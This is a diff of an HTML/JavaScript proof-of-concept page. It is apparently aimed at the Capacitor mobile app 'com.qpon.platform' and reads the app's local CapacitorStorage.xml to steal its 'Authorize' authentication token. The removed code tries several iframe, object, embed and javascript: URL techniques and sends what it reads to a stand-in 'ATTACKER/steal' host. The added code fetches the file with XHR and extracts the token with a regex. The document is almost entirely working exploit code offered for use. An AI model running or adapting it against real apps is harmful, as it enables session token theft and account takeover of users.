@@ -1,103 +1,16 @@
-<html><head><title>Qpon</title></head><body>
-<pre id="log" style="font-size:11px"></pre>
-<script>
-var L=document.getElementById("log");
-function log(s){L.textContent+=s+"\n";console.log(s)}
-log("=== IDENTIFY WHICH TAG LEAKS eyJ ===\n");
+<html><body><pre id="o"></pre><script>
+var o=document.getElementById("o");
+o.textContent="Origin: "+window.origin+"\n";
+o.textContent+="Location: "+window.location.href+"\n\n";
 
-var target="https://localhost/_capacitor_file_/data/data/com.qpon.platform/shared_prefs/CapacitorStorage.xml";
-
-// Each test wrapped in a labeled div so we can see which one shows eyJ
-
-// TEST A: srcdoc with fetch
-var dA=document.createElement("div");
-dA.innerHTML="<b>TEST-A: srcdoc+fetch</b>";
-var iA=document.createElement("iframe");
-iA.style.cssText="width:100%;height:60px;border:2px solid red";
-iA.srcdoc='<script>fetch("'+target+'").then(r=>r.text()).then(d=>{document.write("<pre>TEST-A-RESULT:"+d.substring(0,500)+"</pre>");parent.postMessage({t:"A",d:d},"*")}).catch(e=>{document.write("TEST-A-ERR:"+e.message);parent.postMessage({t:"A_err",d:e.message},"*")})<\/script>';
-dA.appendChild(iA);
-document.body.appendChild(dA);
-
-// TEST B: object tag
-var dB=document.createElement("div");
-dB.innerHTML="<b>TEST-B: object</b>";
-var iB=document.createElement("object");
-iB.data=target;
-iB.type="text/xml";
-iB.style.cssText="width:100%;height:60px;border:2px solid blue";
-dB.appendChild(iB);
-document.body.appendChild(dB);
-
-// TEST C: embed tag
-var dC=document.createElement("div");
-dC.innerHTML="<b>TEST-C: embed</b>";
-var iC=document.createElement("embed");
-iC.src=target;
-iC.type="text/xml";
-iC.style.cssText="width:100%;height:60px;border:2px solid green";
-dC.appendChild(iC);
-document.body.appendChild(dC);
-
-// TEST D: iframe with src (visual)
-var dD=document.createElement("div");
-dD.innerHTML="<b>TEST-D: iframe src</b>";
-var iD=document.createElement("iframe");
-iD.src=target;
-iD.style.cssText="width:100%;height:60px;border:2px solid orange";
-dD.appendChild(iD);
-document.body.appendChild(dD);
-
-// TEST E: iframe sandbox allow-scripts allow-same-origin
-var dE=document.createElement("div");
-dE.innerHTML="<b>TEST-E: iframe sandbox</b>";
-var iE=document.createElement("iframe");
-iE.sandbox="allow-scripts allow-same-origin";
-iE.src=target;
-iE.style.cssText="width:100%;height:60px;border:2px solid purple";
-iE.onload=function(){
-  try{
-    var doc=iE.contentDocument||iE.contentWindow.document;
-    var txt=doc.documentElement?doc.documentElement.textContent:"";
-    if(txt.length>0){log("TEST-E-READ: "+txt.substring(0,300));new Image().src="https://ATTACKER/steal?m=E&d="+encodeURIComponent(txt)}
-  }catch(e){log("TEST-E-BLOCKED: "+e.message)}
+var xhr=new XMLHttpRequest();
+xhr.open("GET","/_capacitor_file_/data/data/com.qpon.platform/shared_prefs/CapacitorStorage.xml",true);
+xhr.onload=function(){
+  o.textContent+="Status: "+xhr.status+"\n";
+  o.textContent+=xhr.responseText+"\n";
+  var m=xhr.responseText.match(/<string name="Authorize">([^<]+)<\/string>/);
+  if(m)o.textContent+="\nTOKEN: "+m[1];
 };
-dE.appendChild(iE);
-document.body.appendChild(dE);
-
-// TEST F: iframe named + window.open javascript:
-var dF=document.createElement("div");
-dF.innerHTML="<b>TEST-F: named frame</b>";
-var iF=document.createElement("iframe");
-iF.name="sf";
-iF.src=target;
-iF.style.cssText="width:100%;height:60px;border:2px solid brown";
-iF.onload=function(){
-  try{window.open("javascript:void(parent.postMessage({t:'F',d:document.documentElement?document.documentElement.textContent:'none'},'*'))","sf")}
-  catch(e){log("TEST-F-BLOCKED: "+e.message)}
-};
-dF.appendChild(iF);
-document.body.appendChild(dF);
-
-// TEST G: srcdoc nested iframe read attempt
-var dG=document.createElement("div");
-dG.innerHTML="<b>TEST-G: srcdoc nested</b>";
-var iG=document.createElement("iframe");
-iG.srcdoc='<iframe src="'+target+'" style="width:100%;height:50px" onload="try{var d=this.contentDocument.documentElement.textContent;parent.parent.postMessage({t:\'G\',d:d},\'*\')}catch(e){parent.parent.postMessage({t:\'G_err\',d:e.message},\'*\')}"></iframe>';
-iG.style.cssText="width:100%;height:60px;border:2px solid cyan";
-dG.appendChild(iG);
-document.body.appendChild(dG);
-
-// Catch all postMessage results
-window.addEventListener("message",function(e){
-  var d=e.data;
-  if(d&&d.t){
-    var preview=d.d?d.d.substring(0,300):"empty";
-    log("\n>>> RESULT [TEST-"+d.t+"] "+preview);
-    if(d.d&&d.d.indexOf("eyJ")>=0){
-      log("!!! TOKEN FOUND IN TEST-"+d.t+" — EXFILTRATION POSSIBLE !!!");
-    }
-  }
-});
-
-log("Each test has colored border. Check which one shows eyJ content.\n");
+xhr.onerror=function(){o.textContent+="XHR Error\n"};
+xhr.send();
 </script></body></html>
